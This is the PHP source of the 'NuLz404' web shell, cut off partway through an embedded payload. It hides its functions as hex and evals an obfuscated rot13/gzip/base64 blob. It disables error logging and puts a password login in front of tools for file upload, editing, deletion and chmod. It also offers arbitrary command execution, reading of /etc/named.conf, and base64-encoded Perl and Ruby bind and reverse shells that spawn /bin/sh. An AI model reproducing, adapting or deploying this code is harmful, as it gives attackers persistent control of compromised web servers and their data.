<?php
/*
Mau Recode Izin Dek! https://t.me/haxorstars
Anti enc enc club kaya lu nub
Kalo Recode Minimal Tambah Fitur Dek Jangan Numpang Nama Doang Nub!
Salam Heker Pro
-NuLz404
*/

session_start();
$shellName = 'NuLz404';
$logo = 'https://nulz-archive.vercel.app/archive/hg1.png';
$func = ["7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65", "7363616e646972", "73797374656d", "65786563", "7061737374687275", "7368656c6c5f65786563", "6f625f6765745f636f6e74656e7473", "6f625f656e645f636c65616e", "6469726e616d65", "6469736b5f746f74616c5f7370616365", "6469736b5f667265655f7370616365", "696e695f676574", "707265675f6d617463685f616c6c", "706f7369785f6765747077756964", "706f7369785f6765746772676964", "70617468696e666f", "66696c656f776e6572", "66696c6567726f7570", "66696c6574797065", "676574686f73746e616d65", "676574686f737462796e616d65", "737562737472", "737472737472", "696e695f736574", "66696c65", "7374725f7265706c616365", "6578706c6f6465", "6576616c", "6f625f7374617274", "66756e6374696f6e5f657869737473", "6572726f725f7265706f7274696e67", "7365745f74696d655f6c696d6974", "636c656172737461746361636865", "646174655f64656661756c745f74696d657a6f6e655f736574", "666c757368", "7374726c656e", "7472696d", "656d707479", "6973736574", "66696c657065726d73", "7374726c656e", "636f756e74", "726f756e64", "6d696d655f636f6e74656e745f74797065", "6765745f63757272656e745f75736572", "6765746d79756964", "6765746d79676964", "706f7369785f67657465756964", "706f7369785f67657465676964", "616464736c6173686573", "73796d6c696e6b", "726d646972", "756e6c696e6b", "61727261795f6d6170", "676c6f62", "686561646572", "706f70656e", "69735f7265736f75726365", "66656f66", "6672656164", "70636c6f7365", "70726f635f6f70656e", "73747265616d5f6765745f636f6e74656e7473", "636c6173735f657869737473", "737072696e7466", "63686d6f64", "666f70656e", "667772697465", "6261736536345f6465636f6465", "66736f636b6f70656e", "6670757473", "6667657473", "66636c6f7365"]; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvTksoXuSd1eV/HQUBcJJlrGuourcBXir6+awhaaWDLzmDeTZGsNogayJw7LivSlVc/U3Ozp9aOgJQmJndjhf3w8pPmG7yQtnkJSlrNG+kHLnTVZGtk3AutrBUuBZekIIEcSUpp/bqAAaCvDOI4bvI1cTitR2PE5TcGDDMUoqEKGSSv0iQKJ7XlHl1K5UYDu2SLL2bSU7B+JiVoO2x4lJXjafjMTBGMVmJClj566FiZeUpegdppg4GUOd6mx6muPve3fPTPCyHvjocdQltM/8Pd0W+9oCGmrJ92zzxrl1T1Gs9yNOuZdbaa69K3S82k/')))));
for ($i = 0; $i < count($func); $i++) {
	$func[$i] = dehex($func[$i]);
}

$func[50](0);
@$func[51](0);
@$func[52]();
@$func[43]('error_log', null);
@$func[43]('log_errors',0);
@$func[43]('max_execution_time',0);
@$func[43]('output_buffering',0);
@$func[43]('display_errors', 0);
$func[53]("Asia/Jakarta");

$passwd = 'd033e22ae348aeb5660fc2140aec35850c4da997'; //pass: admin
if (isset($_POST['btnlogin'])) {
    if (SHA1($_POST['pass']) == $passwd) {
        echo "<script>alert('Login Success! You Pro');</script>";
        $_SESSION["login"] = "login";
        setcookie('login', $passwd, time() + 60);
    } else {
		echo "<script>alert('Login Failed! You Nub');</script>";
    }
}

if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_unset();
    session_destroy();
    setcookie('login', '', time() - 3600);
    echo "<script>window.location.assign('".$_SERVER['PHP_SELF']."')</script>";
    exit();
}

if (empty($_SESSION['login'])) {
    if (empty($_COOKIE['login'])) {
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>NuLz WebShell Login</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="robots" content="noindex, nofollow" />
    <meta name="googlebot" content="noindex, nofollow" />
    <meta name="bingbot" content="noindex, nofollow" />
    <link
      rel="icon"
      href="https://nulz-archive.vercel.app/archive/nulz.ico"
      type="image/x-icon"
    />
    <meta name="description" content=".:Webshell Login:." />
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        background: #000000;
      }
      .login {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }
      img {
        width: 25vh;
        border-radius: 10px;
        margin-bottom: 2rem;
      }
      img:hover {
        box-shadow: 0 0 15pt rgba(255, 255, 255, 0.5);
      }
      form {
        width: 50%;
        height: auto;
        padding: 20px;
        background: #222;
        border-radius: 10px;
        box-shadow: 0 0 15pt rgba(255, 255, 255, 0.2);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
      }
      form label {
        color: #fff;
        font-size: 3.55vh;
        font-family: monospace;
        font-weight: 600;
      }
      form input[type="password"] {
        outline: none;
        width: 100%;
        height: 25px;
        margin-top: 0.2rem;
        padding: 0 10px 0;
        background: transparent;
        color: #00ff00;
        font-family: monospace;
        font-weight: 600;
        border: 1px solid rgba(255, 255, 255, 0.5);
        border-radius: 5px;
      }
      form input[type="password"]:hover {
        box-shadow: 0 0 5pt rgb(0, 255, 17);
      }
      form input[type="text"] {
        outline: none;
        width: 100%;
        height: 25px;
        margin-top: 0.2rem;
        padding: 0 10px 0;
        background: transparent;
        color: #00ff00;
        font-family: monospace;
        font-weight: 600;
        border: 1px solid rgba(255, 255, 255, 0.5);
        border-radius: 5px;
      }
      form input[type="text"]:hover {
        box-shadow: 0 0 5pt rgb(0, 255, 17);
      }
      form span {
        display: flex;
        justify-content: center;
        align-items: center;
        margin-top: 1rem;
        color: #fff;
        font-size: 1.75vh;
        font-weight: 600;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
      }
      form button {
        margin-top: 1rem;
        background: transparent;
        border: 1px solid rgba(255, 255, 255, 0.5);
        border-radius: 5px;
        padding: 5px 10px 5px;
        color: #fff;
        font-size: 2, 50vh;
        font-weight: 600;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
      }
      form button:hover {
        background: #777;
        box-shadow: inset 0 0 5pt rgb(0, 255, 17), 0 0 5pt rgb(0, 255, 17);
      }
    </style>
  </head>
  <body>
    <div class="login">
      <a href="https://t.me/haxorstars">
      <img
        src="https://nulz-archive.vercel.app/archive/nulz.png"
        alt="NuLz404"
      />
      </a>
      <form method="POST" enctype="multipart/form-data">
        <label for="pass">Password</label>
        <input type="password" name="pass" id="pass" />
        <span>Show Pass <input type="checkbox" onclick="showPass()" /></span>
        <script>
          function showPass() {
            var x = document.getElementById("pass");
            if (x.type === "password") {
              x.type = "text";
            } else {
              x.type = "password";
            }
          }
        </script>
        <button type="submit" name="btnlogin">Login</button>
      </form>
    </div>
  </body>
</html>
<?php
exit();
}
}
if (isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	$func[3]($dir);
} else {
	$dir = $func[2]();
}
	
if ($func[12]("/etc/named.conf")) {
	$d0mains = read("/etc/named.conf");
	if (!$d0mains) {
		$dom = "<font style='color: #ff0000;'>Can't Read /etc/named.conf</font>";
	} else { 
		$count = 0;
		foreach ($d0mains as $d0main) {
			if (@$func[42]($d0main, "zone")) {
				$func[32]('#zone "(.*)"#', $d0main, $domains);
				$func[54]();
				if ($func[55]($func[56]($domains[1][0])) > 2){
					$func[54]();
					$count++;
				}
			}
		}
		if ($count > 0) {
			$dom = "<font style='color: #00ff00; text-shadow: 0 0 15px rgba(255,255,255,0.3);'>$count Domain</font>";
		} else {
			$dom = "<font style='color: #ffee00;'>Can't get Domain</font>";
		}
	}
} else {
	$dom = "<font style='color: #ff0000;'>Can't Read /etc/named.conf</font>";
}

$dir = $func[45]("\\", "/", $dir);
$scdir = $func[46]("/", $dir);
$total = $func[29]($dir);
$free = $func[30]($dir);
$pers =  (int) ($free / $total * 100);
$ds = @$func[31]("disable_functions");
$show_ds = (!empty($ds)) ? "<font style='color: #ffee00;'>$ds</font>" : "<font style='color: #00ff00; text-shadow: 0 0 15px rgba(255,255,255,0.3);'>All function is accessible</font>";

$cmd_uname = exe("uname -a");
$uname = $func[49]('php_uname') ? $func[41](@$func[0](), 0, 120) : ($func[55]($cmd_uname) > 0 ? $cmd_uname : '( php_uname ) Function Disabled !');

if (strtolower($func[41](PHP_OS, 0, 3)) == "win") {
	$sys = "win";
} else {
	$sys = "unix";
}

if (isset($_GET['do'])) {
	$do = $_GET['do'];
	if ($do == 'delete') {
		if ($func[12]($dir)) {
			if (deleter($dir)) {
				flash("File/Folder deleted successfully!", "Success", "success", "?dir=" . $func[28]($dir));
				echo "<script>history.back()</script>";
			} else {
				flash("File/Folder failed to delete!", "Failed", "danger", "?dir=" . $func[28]($dir));
				echo "<script>history.back()</script>";
			}
		} else {
			flash("File/Folder is doesn't exist!", "Failed", "warning", "?dir=" . $func[28]($dir));
			echo "<script>history.back()</script>";
		}
	} else if ($do == 'get-source') {
		if (isset($_GET['filename'])) {
			die($func[14]($_GET['filename']));
		}
	} else if ($do == 'terminal') {
		if (isset($_GET['command'])) {
			die('<pre>'.exe($_GET['command']).'</pre>');
		}
	} else if ($do == 'jumping') {
		die(jumping());
	} else if ($do == 'get-config') {
		die(getConfig());
	} else if ($do == 'bind-port') {
		if (isset($_GET['port'])) {
			die(networkTools(1, $_GET['port']));
		}
	} else if ($do == 'back-connect') {
		if (isset($_GET['host']) && isset($_GET['port'])) {
			die(networkTools(2, $_GET['port'], $_GET['host'], $_GET['with']));
		}
	}
} else {
	$do = 'filesman';
	$title = 'Files Manager';
	$icon = 'archive';
}

((isset($_POST["foldername"])) ? ($func[12]("$dir/{$_POST['foldername']}") ? flash("Folder name is exist!", "Failed", "warning") : ($func[15]("$dir/{$_POST['foldername']}") ? flash("Folder created successfully!", "Success", "success") : flash("Folder failed to create!", "Failed", "danger"))) : null);

((isset($_POST["filename"]) && isset($_POST['filecontent'])) ? ($func[12]("$dir/{$_POST['filename']}") ? flash("File name is exist!", "Failed", "warning") : ($func[13]("$dir/{$_POST['filename']}", $_POST['filecontent']) ? flash("File created successfully!", "Success", "success") : flash("File failed to create!", "Failed", "danger"))) : null);

((isset($_POST["newname"]) && isset($_POST['oldname'])) ? ($func[12]("$dir/{$_POST['newname']}") ? flash("File/Folder name is exist!", "Failed", "warning") : ($func[16]("$dir/{$_POST['oldname']}", $_POST['newname']) ? flash("File/Folder renamed successfully!", "Success", "success") : flash("File/Folder failed to rename!", "Failed", "danger"))) : null);

((isset($_POST["filename"]) && isset($_POST['content'])) ? ($func[13]("$dir/{$_POST['filename']}", $_POST['content']) ? flash("File saved successfully!", "Success", "success") : flash("File failed to save!", "Failed", "danger")) : null);

((isset($_POST["filename"]) && isset($_POST['perm'])) ? ($func[85]("$dir/{$_POST['filename']}", $_POST['perm']) ? flash("File permission changed successfully!", "Success", "success") : flash("File permission failed to change!", "Failed", "danger")) : null);

if (isset($_FILES["uploadfile"])) {
	$n = $_FILES["uploadfile"]["name"];
	for ($i = 0; $i < $func[61]($n); $i++) {
		if ($func[11]($_FILES["uploadfile"]["tmp_name"][$i], $n[$i])) {
			flash("File uploaded successfully!", "Success", "success");
		} else {
			flash("File failed to upload!", "Failed", "danger");
		}
	}
}

if (@$func[31]('open_basedir')) {
	$basedir_data = @$func[31]('open_basedir');
	if ($func[55]($basedir_data) > 120){
		$open_b = "<font style='color: #00ff00; text-shadow: 0 0 15px rgba(255,255,255,0.3);'" . $func[41]($basedir_data, 0, 120) . "...</font>";
	} else {
		$open_b = '<font style="color: #00ff00; text-shadow: 0 0 15px rgba(255,255,255,0.3);"' . $basedir_data . '</font>';
	}
} else {
	$open_b = '<font style="color: #ffee00;">NONE</font>';
}

if (!$func[49]('posix_getegid')) {
	$user = $func[49]("get_current_user") ? @$func[64]() : "????";
	$uid = $func[49]("getmyuid") ? @$func[65]() : "????";
	$gid = $func[49]("getmygid") ? @$func[66]() : "????";
	$group = "?";
} else {
	$uid = $func[49]("posix_getpwuid") && $func[49]("posix_geteuid") ? @$func[33]($func[67]()) : ["name" => "????", "uid" => "????"];
	$gid = $func[49]("posix_getgrgid") && $func[49]("posix_getegid") ? @$func[34]($func[68]()) : ["name" => "????", "gid" => "????"];
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

if ($sys == 'unix') {
	if (!@$func[31]('safe_mode')) {
		if ($func[55](exe("id")) > 0) {
			$userful = ['gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl','git','docker', 'ssh'];
			$x = 0;
			foreach ($userful as $i) {
				if (which($i)) {
					$x++;
					$useful .= $i . ', ';
				}
			}
			if ($x == 0) {
				$useful = '--------';
			}
			$downloaders = ['wget','fetch','lynx','links','curl','get','lwp-mirror'];
			$x = 0;
			foreach($downloaders as $i) {
				if (which($i)) {
					$x++;
					$downloader .= $i . ', ';
				}
			}
			if ($x == 0) {
				$downloader = '--------';
			}
		} else {
			$useful = '--------';
			$downloader = '--------';
		}
	} else {
		$useful = '--------';
		$downloader = '--------';
	}
}

function hex($str) {
	global $func;
	$r = "";
	for ($i = 0; $i < $func[55]($str); $i++) {
		$r .= dechex(ord($str[$i]));
	}
	return $r;
}

function dehex($str) {
	$r = "";
	$len = (strlen($str) - 1);
	for ($i = 0; $i < $len; $i += 2) {
		$r .= chr(hexdec($str[$i].$str[$i + 1]));
	}
	return $r;
}

function formatSize($bytes) {
	global $func;
	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	for ( $i = 0; $bytes >= 1024 && $i < ( $func[61]( $types ) - 1 ); $bytes /= 1024, $i++ );
	return( $func[62]( $bytes, 2 )." ".$types[$i] );
}

function perms($file) {
	global $func;
	$perms = $func[59]($file);
	if (($perms & 0xC000) == 0xC000) {
		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000){
		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	$info = 'p';
	} else {
		$info = 'u';
	}
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $func[41]($func[84]('%o', $perms), -4) . ' >> ' .$info;
}

function exe($in) {
	global $func;
	$out = '';
	try {
		if ($func[49]('exec')) {
			@$func[23]($in, $out);
			$out = @join("\n", $out);
			return $out;
		} elseif ($func[49]('passthru')) {
			$func[48]();
			@$func[24]($in);
			$out = $func[27]();
			return $out;
		} elseif($func[49]('system')) {
			$func[48]();
			@$func[22]($in);
			$out = $func[27]();
			return $out;
		} elseif ($func[49]('shell_exec')) {
			$out = $func[25]($in);
			return $out;
		} elseif ($func[49]("popen") && $func[49]("pclose")) {
			if ($func[77]($f = @$func[76]($in, "r"))) {
				$out = "";
				while(!@$func[78]($f))
				$out .= $func[79]($f, 1024);
				$func[80]($f);
				return $out;
			}
		} elseif ($func[49]('proc_open')) {
			$pipes = [];
			$process = @$func[81]($in.' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
			$out = @$func[82]($pipes[1]);
			return $out;
		} elseif ($func[83]('COM')) {
			$ws = new COM('WScript.shell');
			$exec = $ws->exec('cmd.exe /c '.$in);
			$stdout = $exec->StdOut();
			$out = $stdout->ReadAll();
			return $out;
		}
	} catch(Exception $e) {}
	return $out;
}

function checkName($name) {
	global $func;
	if ($func[55]($name) > 18) {
		return $func[41]($name, 0, 18) . "...";
	}
	return $name;
}

function checkPerm($dir, $perm) {
	global $func;
	$perm = $func[46]('>>', $perm);
	if ($func[8]($dir)) {
		return "<font style='color: #00ff00; text-shadow: 0 0 15px rgba(255,255,255,0.3);' data-bs-toggle='modal' data-bs-target='#chmodModal' data-bs-perm='".trim($perm[0])."' data-bs-name='".$dir."'>".$perm[0]."</font> >> <font style='color: #00ff00; text-shadow: 0 0 15px rgba(255,255,255,0.3);' data-bs-toggle='modal' data-bs-target='#chmodModal' data-bs-perm='".trim($perm[0])."' data-bs-name='".$dir."'>".$perm[1]."</font>";
	} elseif (!$func[9]($dir)) {
		return "<font style='color: #ff0000; text-shadow: 0 0 15px rgba(255,255,255,0.3);' data-bs-toggle='modal' data-bs-target='#chmodModal' data-bs-perm='".trim($perm[0])."' data-bs-name='".$dir."'>".$perm[0]."</font> >> <font style='color: #ff0000; text-shadow: 0 0 15px rgba(255,255,255,0.3);' data-bs-toggle='modal' data-bs-target='#chmodModal' data-bs-perm='".trim($perm[0])."' data-bs-name='".$dir."'>".$perm[1]."</font>";
	} else {
		return "<font style='color: #ffffff; text-shadow: 0 0 15px rgba(0,0,0,0.3);' data-bs-toggle='modal' data-bs-target='#chmodModal' data-bs-perm='".trim($perm[0])."' data-bs-name='".$dir."'>".$perm[0]."</font> >> <font style='color: #ffffff; text-shadow: 0 0 15px rgba(0,0,0,0.3);' data-bs-toggle='modal' data-bs-target='#chmodModal' data-bs-perm='".trim($perm[0])."' data-bs-name='".$dir."'>".$perm[1]."</font>";
	}
}

function getowner($item) {
	global $func;
	if ($func[49]("posix_getpwuid")) {
		$downer = @$func[33]($func[36]($item));
		$downer = $downer['name'];
	} else {
		$downer = $func[36]($item);
	}
	if ($func[49]("posix_getgrgid")) {
		$dgrp = @$func[34]($func[37]($item));
		$dgrp = $dgrp['name'];
	} else {
		$dgrp = $func[37]($item);
	}
	return $downer . '/' . $dgrp;
}

function geticon($file) {
	global $func;
	$ext = strtolower($func[35]($file, PATHINFO_EXTENSION));
	if ($ext == 'php' || $ext == 'html' || $ext == 'js' || $ext == 'css' || $ext == 'py' || $ext == 'perl' || $ext == 'sh') {
		return 'file-code';
	} else if ($ext == 'pdf') {
		return 'file-pdf';
	} else if ($ext == 'txt') {
		return 'file-alt';
	} else if ($ext == 'csv') {
		return 'file-csv';
	} else if ($ext == 'jpg' || $ext == 'png' || $ext == 'jpeg' || $ext == 'gif') {
		return 'file-image';
	} else if ($ext == 'mp4' || $ext == '3gp' || $ext == 'mkv') {
		return 'file-video';
	} else if ($ext == 'docx' || $ext == 'doc' || $ext == 'docm') {
		return 'file-word';
	} else if ($ext == 'ppt' || $ext == 'pptx') {
		return 'file-powerpoint';
	} else if ($ext == 'xlsx' || $ext == 'xlsb' || $ext == 'xlsm' || $ext == 'xltx' || $ext == 'xltm') {
		return 'file-excel';
	} else if ($ext == 'mp3' || $ext == 'wav') {
		return 'file-audio';
	} else if ($ext == 'sql' || $ext == 'db') {
		return 'database';
	} else if ($ext == 'zip' || $ext == 'tar' || $ext == 'gz' || $ext == 'tar.gz' || $ext == '7z' || $ext == 'bz2') {
		return 'file-archive';
	} else {
		return 'file';
	}
}

function which($p) {
	global $func;
	$path = exe('which ' . $p);
	if (!empty($path)) {
		return $func[55]($path);
	}
	return false;
}

function flash($message, $status, $class, $redirect = false) {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["class"])) {
		unset($_SESSION["class"]);
	}
	if (!empty($_SESSION["status"])) {
		unset($_SESSION["status"]);
	}
	$_SESSION["message"] = $message;
	$_SESSION["class"] = $class;
	$_SESSION["status"] = $status;
	if ($redirect) {
		$func[75]('Location: ' . $redirect);
		exit();
	}
	return true;
}

function clear() {
	if (!empty($_SESSION["message"])) {
		unset($_SESSION["message"]);
	}
	if (!empty($_SESSION["class"])) {
		unset($_SESSION["class"]);
	}
	if (!empty($_SESSION["status"])) {
		unset($_SESSION["status"]);
	}
	return true;
}

function deleter($d) {
	global $func;
	if ($func[56]($func[35]($d, PATHINFO_BASENAME), '.') === '') {
		return false;
	};
	if ($func[6]($d)) {
		$func[73]("deleter", $func[74]($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
		$func[71]($d);
		return true;
	} else {
		$func[72]($d);
		return true;
	}
	return false;
}

function read($file) {
	global $func;
	$array = @$func[44]($file);
	if (!$array) {
		if ($func[60](exe("id")) > 0) {
			$data = exe('cat "'.$func[69]($file).'"');
			if ($func[60]($data) > 0) {
				return $func[46]("\n", $data);
			} else {
				return false;
			}
		} else {
			return false;
		}
	} else {
		return $array;
	}
}

function networkTools($type, $port, $host = null, $with = 'php') {
	global $func;
	if ($type == 1) {
		$bp = $func[88]("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
		$brt = @$func[86]('bp.pl', 'w');
		$func[87]($brt, $bp);
		$out = exe("perl bp.pl $port 1>/dev/null 2>&1 &");
		sleep(1);
		$res = "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
		$func[72]("bp.pl");
		return $res;
	} else {
		if ($with == 'ruby') {
			$cont = $func[88]("IyEvdXNyL2Jpbi9lbnYgcnVieQojIE51THo0MDQgKGMpIDIwMTgKIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsCiMgTnVMejQwNApyZXF1aXJlICdzb2NrZXQnCnJlcXVpcmUgJ3BhdGhuYW1lJwoKZGVmIHVzYWdlCglwcmludCAiYmluZCA6XHJcbiAgcnVieSAiICsgRmlsZS5iYXNlbmFtZShfX0ZJTEVfXykgKyAiIFtwb3J0XVxyXG4iCglwcmludCAicmV2ZXJzZSA6XHJcbiAgcnVieSAiICsgRmlsZS5iYXNlbmFtZShfX0ZJTEVfXykgKyAiIFtwb3J0XSBbaG9zdF1cclxuIgplbmQKCmRlZiBzdWNrcwoJc3Vja3MgPSBmYWxzZQoJaWYgUlVCWV9QTEFURk9STS5kb3duY2FzZS5tYXRjaCgnbXN3aW58d2lufG1pbmd3JykKCQlzdWNrcyA9IHRydWUKCWVuZAoJcmV0dXJuIHN1Y2tzCmVuZAoKZGVmIHJlYWxwYXRoKHN0cikKCXJlYWwgPSBzdHIKCWlmIEZpbGUuZXhpc3RzPyhzdHIpCgkJZCA9IFBhdGhuYW1lLm5ldyhzdHIpCgkJcmVhbCA9IGQucmVhbHBhdGgudG9fcwoJZW5kCglpZiBzdWNrcwoJCXJlYWwgPSByZWFsLmdzdWIoL1wvLywiXFwiKQoJZW5kCglyZXR1cm4gcmVhbAplbmQKCmlmIEFSR1YubGVuZ3RoID09IDEKCWlmIEFSR1ZbMF0gPX4gL15bMC05XXsxLDV9JC8KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQoJZWxzZQoJCXVzYWdlCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiIKCQlleGl0CgllbmQKCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpCglzID0gc2VydmVyLmFjY2VwdAoJcG9ydCA9IHMucGVlcmFkZHJbMV0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdCglzLnByaW50ICIqKiogY29ubmVjdGVkXHJcbiIKCXB1dHMgIioqKiBjb25uZWN0ZWQgOiAje25hbWV9OiN7cG9ydH1cclxuIgoJYmVnaW4KCQlpZiBub3Qgc3Vja3MKCQkJZiA9IHMudG9faQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikKCQllbHNlCgkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+IgoJCQl3aGlsZSBsaW5lID0gcy5nZXRzCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8KCQkJCWlmIG5vdCBsaW5lLmNob21wID09ICIiCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lKQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpCgkJCQkJCQlEaXIuY2hkaXIobGluZSkKCQkJCQkJZW5kCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+IgoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kKCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUuY2hvbXApCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkKCQkJCQkJZW5kCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+IgoJCQkJCWVsc2UKCQkJCQkJSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQoJCQkJCWVuZAoJCQkJZW5kCgkJCWVuZAoJCWVuZAoJcmVzY3VlIGVycm9yQnJvCgkJcHV0cyAiKioqICN7bmFtZX06I3twb3J0fSBkaXNjb25uZWN0ZWQiCgllbnN1cmUKCQlzLmNsb3NlCgkJcyA9IG5pbAoJZW5kCmVsc2lmIEFSR1YubGVuZ3RoID09IDIKCWlmIEFSR1ZbMF0gPX4gL15bMC05XXsxLDV9JC8KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQoJCWhvc3QgPSBBUkdWWzFdCgllbHNpZiBBUkdWWzFdID1+IC9eWzAtOV17MSw1fSQvCgkJcG9ydCA9IEludGVnZXIoQVJHVlsxXSkKCQlob3N0ID0gQVJHVlswXQoJZWxzZQoJCXVzYWdlCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiIKCQlleGl0CgllbmQKCXMgPSBUQ1BTb2NrZXQubmV3KCIje2hvc3R9IiwgcG9ydCkKCXBvcnQgPSBzLnBlZXJhZGRyWzFdCgluYW1lID0gcy5wZWVyYWRkclsyXQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iCglwdXRzICIqKiogY29ubmVjdGVkIDogI3tuYW1lfToje3BvcnR9IgoJYmVnaW4KCQlpZiBub3Qgc3Vja3MKCQkJZiA9IHMudG9faQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIiwgZiwgZiwgZikKCQllbHNlCgkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+IgoJCQl3aGlsZSBsaW5lID0gcy5nZXRzCgkJCQlyYWlzZSBlcnJvckJybyBpZiBsaW5lID1+IC9eZGllXHI/JC8KCQkJCWlmIG5vdCBsaW5lLmNob21wID09ICIiCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQoJCQkJCQlsaW5lID0gbGluZS5nc3ViKC9jZCAvaSwgJycpLmNob21wCgkJCQkJCWlmIEZpbGUuZGlyZWN0b3J5PyhsaW5lKQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpCgkJCQkJCQlEaXIuY2hkaXIobGluZSkKCQkJCQkJZW5kCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+IgoJCQkJCWVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kKCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUuY2hvbXApCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkKCQkJCQkJZW5kCgkJCQkJCXMucHJpb